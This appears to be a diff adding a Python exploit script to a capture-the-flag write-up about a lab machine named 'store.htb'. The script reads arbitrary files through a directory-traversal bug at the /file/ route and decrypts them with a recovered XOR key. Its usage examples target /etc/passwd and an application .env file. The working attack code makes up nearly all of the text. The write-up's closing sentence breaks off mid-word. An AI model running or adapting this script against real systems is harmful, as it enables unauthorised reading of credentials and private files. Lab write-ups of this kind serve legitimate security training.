@@ -111,5 +111,138 @@ And i get the key as `Hm9zeWC38`
 And this can be used to decrypt any file on the system
 
 ```python
-
+#!/usr/bin/env python3
+"""
+store_file_read.py
+ 
+Reads an arbitrary file off the target via the /file/ directory-traversal
+LFI-style bug, pulls the base64-encoded ciphertext blob out of the returned
+HTML page source, and decrypts it with the recovered repeating XOR key.
+ 
+Usage:
+    python3 store_file_read.py <host> <absolute-path> [--port 5000] [--key Hm9zeWC38]
+ 
+Examples:
+    python3 store_file_read.py store.htb /etc/passwd
+    python3 store_file_read.py 10.129.31.17 /etc/hostname --port 5000
+    python3 store_file_read.py store.htb /home/dev/projects/store1/.env
+"""
+ 
+import argparse
+import base64
+import re
+import sys
+from itertools import cycle
+from urllib.parse import quote
+ 
+import requests
+ 
+# Default recovered key -- override with --key if you're hitting a fresh
+# instance and the secret turns out to be different.
+DEFAULT_KEY = b"Hm9zeWC38"
+ 
+# Number of "../" traversal segments to prepend. The app builds the path as
+# STORE_HOME/public/tmp/<name>, so we need enough ../ to climb back to /.
+TRAVERSAL_DEPTH = 8
+ 
+ 
+def build_traversal_path(target_path: str, depth: int = TRAVERSAL_DEPTH) -> str:
+    """
+    Build the /file/<...> path segment with directory traversal.
+    target_path should be an absolute path, e.g. /etc/passwd
+    """
+    target_path = target_path.lstrip("/")
+    traversal = "../" * depth
+    full = traversal + target_path
+    # URL-encode every slash so it survives Express's routing/normalization
+    return quote(full, safe="")
+ 
+ 
+def fetch_encrypted_blob(host: str, port: int, target_path: str, depth: int, timeout: float):
+    path_segment = build_traversal_path(target_path, depth)
+    url = f"http://{host}:{port}/file/{path_segment}"
+ 
+    try:
+        resp = requests.get(url, timeout=timeout)
+    except requests.exceptions.ReadTimeout:
+        return None, url
+    except requests.exceptions.ConnectionError as e:
+        print(f"[!] Connection error: {e}")
+        sys.exit(1)
+ 
+    # Look for the base64 data URI embedded in the HTML page source.
+    # e.g. data:application/octet-stream;charset=utf-8;base64,AAAA....
+    match = re.search(
+        r"base64,([A-Za-z0-9+/=]+)",
+        resp.text,
+    )
+    if not match:
+        return None, url
+ 
+    return match.group(1), url
+ 
+ 
+def xor_decrypt(ciphertext: bytes, key: bytes) -> bytes:
+    return bytes(c ^ k for c, k in zip(ciphertext, cycle(key)))
+ 
+ 
+def main():
+    parser = argparse.ArgumentParser(
+        description="Read + decrypt an arbitrary file via the /file/ traversal bug."
+    )
+    parser.add_argument("host", help="Target host/IP, e.g. store.htb or 10.129.31.17")
+    parser.add_argument("path", help="Absolute path on the target to read, e.g. /etc/passwd")
+    parser.add_argument("--port", type=int, default=5000, help="Target port (default: 5000)")
+    parser.add_argument(
+        "--key",
+        default=DEFAULT_KEY.decode(),
+        help=f"XOR key as ASCII (default recovered key: {DEFAULT_KEY.decode()!r})",
+    )
+    parser.add_argument(
+        "--depth",
+        type=int,
+        default=TRAVERSAL_DEPTH,
+        help=f"Number of ../ traversal segments to prepend (default: {TRAVERSAL_DEPTH})",
+    )
+    parser.add_argument(
+        "--timeout",
+        type=float,
+        default=3.0,
+        help="Request timeout in seconds -- nonexistent files hang, so keep this short",
+    )
+    parser.add_argument(
+        "--raw",
+        action="store_true",
+        help="Write decrypted output as raw bytes to stdout instead of decoded text "
+             "(use for binary files like images)",
+    )
+    args = parser.parse_args()
+ 
+    key = args.key.encode()
+ 
+    b64_blob, url = fetch_encrypted_blob(
+        args.host, args.port, args.path, args.depth, args.timeout
+    )
+ 
+    if b64_blob is None:
+        print(f"[!] Could not find encrypted data in response from {url}")
+        print("    (file may not exist, traversal depth may be wrong, or the")
+        print("     app's HTML structure may differ -- check manually with curl)")
+        sys.exit(1)
+ 
+    ciphertext = base64.b64decode(b64_blob)
+    plaintext = xor_decrypt(ciphertext, key)
+ 
+    if args.raw:
+        sys.stdout.buffer.write(plaintext)
+    else:
+        sys.stdout.write(plaintext.decode(errors="replace"))
+        if not plaintext.endswith(b"\n"):
+            sys.stdout.write("\n")
+ 
+ 
+if __name__ == "__main__":
+    main()
 ```
+
+Now with the help of AI ill build a sc
